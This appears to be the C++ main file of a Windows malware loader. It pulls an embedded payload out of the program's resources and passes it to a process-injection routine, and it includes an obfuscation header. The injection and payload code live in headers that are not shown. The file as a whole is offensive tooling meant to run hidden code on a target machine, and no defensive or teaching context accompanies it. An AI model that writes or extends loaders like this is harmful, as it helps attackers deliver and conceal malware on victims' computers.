#include <windows.h>
#include <iostream>

#include "../includes/Obfuscate.h"
#include "../includes/startInjection.h"
#include "../includes/Resource.h"  // Include the header for IDR_PAYLOAD

using namespace std;

// Helper function to load the embedded payload from the resource
HGLOBAL LoadPayloadResource(DWORD& payloadSize) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (hResource == NULL) {
        cerr << "[error] Failed to find payload resource.\n";
        return NULL;
    }

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (hLoadedResource == NULL) {
        cerr << "[error] Failed to load payload resource.\n";
        return NULL;
    }

    payloadSize = SizeofResource(NULL, hResource);
    return hLoadedResource;
}

int main() {
    DWORD payloadSize;
    HGLOBAL hPayload = LoadPayloadResource(payloadSize);
    if (hPayload == NULL) {
        cerr << "[error] Failed to load payload.\n";
        return 1;
    }

    // Lock the resource to get a pointer to the payload data
    LPVOID pPayloadData = LockResource(hPayload);
    if (pPayloadData == NULL) {
        cerr << "[error] Failed to lock payload resource.\n";
        return 1;
    }

    startInjection(static_cast<unsigned char*>(pPayloadData), payloadSize);
    return 0;
}
